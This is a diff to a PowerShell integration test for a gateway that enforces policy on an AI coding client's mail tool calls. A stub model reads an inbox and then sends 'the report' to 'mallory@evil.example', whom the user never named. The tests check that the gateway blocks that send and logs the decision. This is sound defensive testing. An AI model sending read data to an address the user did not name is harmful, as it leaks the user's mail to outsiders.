@@ -1,5 +1,5 @@
 # Drives the real Claude Code client through the gateway, with no model and no paid API, then checks
-# the audit log. This is the runnable end of milestones 1 and 2.
+# the audit log and what reached the server. This is the runnable end of milestones 1 to 3.
 #
 #     pwsh -NoProfile -File test/interop/run.ps1
 #
@@ -58,6 +58,31 @@ function Invoke-Client([string]$name, [string]$file, [string[]]$arguments, [int]
         return 124
     }
     return $p.ExitCode
+}
+
+# Milestone 3's flow: the model reads the inbox, then sends to $to. The prompt file says what the user
+# asked for, a stub model of its own plays the two calls, and "sayswho run" starts the real client.
+function Invoke-MailFlow([string]$name, [string]$prompt, [string]$to, [string[]]$clientFlags = @()) {
+    $promptFile = Join-Path $work "$name.prompt"
+    [IO.File]::WriteAllText($promptFile, $prompt)
+    $steps = Join-Path $work "$name.steps"
+    [IO.File]::WriteAllText($steps, '[{"tool":"mcp__sayswho__mail__read_inbox","input":{}},' +
+        '{"tool":"mcp__sayswho__mail__send_mail","input":{"to":"' + $to + '","body":"the report"}}]')
+    $flowPort = Join-Path $work "$name.port"
+    $flowStub = Start-Process -FilePath $model -NoNewWindow -PassThru `
+        -ArgumentList ('-log "{0}" -portfile "{1}" -steps "{2}"' -f (Join-Path $work "$name.model.log"), $flowPort, $steps) `
+        -RedirectStandardOutput (Join-Path $work "$name.stub.out") -RedirectStandardError (Join-Path $work "$name.stub.err")
+    try {
+        for ($i = 0; $i -lt 100 -and -not (Test-Path $flowPort); $i++) { Start-Sleep -Milliseconds 50 }
+        if (-not (Test-Path $flowPort)) { throw "the stub model for $name did not start" }
+        $env:ANTHROPIC_BASE_URL = 'http://127.0.0.1:' + (Get-Content $flowPort).Trim()
+        return Invoke-Client $name $gateway (@('run', '--policy', $mailPolicy, '--state', (Join-Path $work "$name-state"),
+                '--prompt-file', $promptFile, '--client', $claude.Source, '--', '-p', '--model', 'stub',
+                '--allowedTools', 'mcp__sayswho__mail__read_inbox,mcp__sayswho__mail__send_mail',
+                '--output-format', 'json') + $clientFlags) 120
+    } finally {
+        Stop-Process -Id $flowStub.Id -Force -ErrorAction SilentlyContinue
+    }
 }
 
 # Runs sayswho verify, prints what it said, and returns the exit code.
@@ -175,6 +200,49 @@ try {
     $cut = Join-Path $work 'cut.log'
     [IO.File]::WriteAllText($cut, ([IO.File]::ReadAllLines($log))[0] + "`n")
     Check 'verify fails with exit 1 when lines before a saved head are gone' ((Invoke-Verify 'verify-cut' @($cut, '--head', $head)) -eq 1)
+
+    # Milestone 3: init drafts a policy from what the server lists, and that policy is enforced.
+    Write-Output '--- sayswho init'
+    $sends = Join-Path $work 'sends.log'
+    $mailBase = Join-Path $work 'mail-base.json'
+    Write-Json $mailBase @{ mode = 'value'; servers = @{ mail = @{ command = $echo; args = @('-sends', $sends) } } }
+    $code = Invoke-Client 'init' $gateway @('init', '--policy', $mailBase) 60
+    $draft = Read-Text (Join-Path $work 'init.out')
+    Check 'init exits 0' ($code -eq 0) (Read-Text (Join-Path $work 'init.err'))
+    Check 'init drafts send_mail as an act' ($draft -match '"mail__send_mail":\s*\{\s*"effect":\s*"act"') $draft
+    $mailPolicy = Join-Path $work 'mail-policy.json'
+    [IO.File]::WriteAllText($mailPolicy, $draft)
+
+    # A read, then a send to someone the user never named. Print mode has no person to ask, so the
+    # client cancels the question: the call must be refused, and the model must be told the rule.
+    Write-Output '--- sayswho run: a send to someone not in the prompt'
+    $code = Invoke-MailFlow 'refused' 'Summarize my inbox and tell alice@corp.example what it says.' 'mallory@evil.example'
+    $modelSaw = Read-Text (Join-Path $work 'refused.model.log')
+    $logText = Read-Text (Join-Path (Join-Path $work 'refused-state') 'audit.log')
+    Check 'run exits 0 after the refusal' ($code -eq 0) ((Read-Text (Join-Path $work 'refused.err')) + (Read-Text (Join-Path $work 'refused.out')))
+    Check 'the rule ID reached the model' ($modelSaw -match 'Blocked by SaysWho, rule ask-cancelled') $modelSaw
+    Check 'the server never received the send' (-not (Read-Text $sends).Contains('mallory')) (Read-Text $sends)
+    Check 'the log holds why it asked and how that ended' (($logText -match '"decision":"ask","rule":"unsourced-control"') -and ($logText -match '"decision":"block","rule":"ask-cancelled"')) $logText
+    Check 'the recipient is not in the log' (-not $logText.Contains('mallory'))
+
+    # The same flow with a recipient named in the prompt goes through, and nobody is asked.
+    Write-Output '--- sayswho run: a send to someone named in the prompt'
+    $code = Invoke-MailFlow 'allowed' 'Summarize my inbox and tell alice@corp.example what it says.' 'alice@corp.example'
+    $logText = Read-Text (Join-Path (Join-Path $work 'allowed-state') 'audit.log')
+    Check 'run exits 0' ($code -eq 0) ((Read-Text (Join-Path $work 'allowed.err')) + (Read-Text (Join-Path $work 'allowed.out')))
+    Check 'the server received the send' ((Read-Text $sends).Contains('SENT to=alice@corp.example')) (Read-Text $sends)
+    Check 'the log says the prompt vouched for it' ($logText -match '"decision":"allow","sources":\["prompt"\]') $logText
+    Check 'nobody was asked' ($logText -notmatch '"decision":"ask"') $logText
+    Check 'verify passes on that log' ((Invoke-Verify 'verify-allowed' @((Join-Path (Join-Path $work 'allowed-state') 'audit.log'))) -eq 0)
+
+    # DESIGN section 7 asks whether --restricted works with this setup. This records the answer.
+    Write-Output '--- sayswho run: the same two flows with --restricted'
+    $code = Invoke-MailFlow 'restricted-allowed' 'Summarize my inbox and tell bob@corp.example what it says.' 'bob@corp.example' @('--restricted')
+    Check 'with --restricted, a named recipient still goes through' (($code -eq 0) -and (Read-Text $sends).Contains('SENT to=bob@corp.example')) ((Read-Text (Join-Path $work 'restricted-allowed.err')) + (Read-Text (Join-Path $work 'restricted-allowed.out')))
+    $code = Invoke-MailFlow 'restricted-refused' 'Summarize my inbox and tell bob@corp.example what it says.' 'mallory@evil.example' @('--restricted')
+    Check 'with --restricted, an unnamed recipient is still refused' (-not (Read-Text $sends).Contains('mallory')) (Read-Text $sends)
+    $modelSaw = Read-Text (Join-Path $work 'restricted-refused.model.log')
+    Check 'with --restricted, the model still sees no built-in tools and the rule ID' (($modelSaw -match 'Blocked by SaysWho') -and ($modelSaw -notmatch 'builtinTools=true')) $modelSaw
 
     # Nothing of ours may still be running: the client ended the gateway and the gateway ended the server.
     Start-Sleep -Milliseconds 500
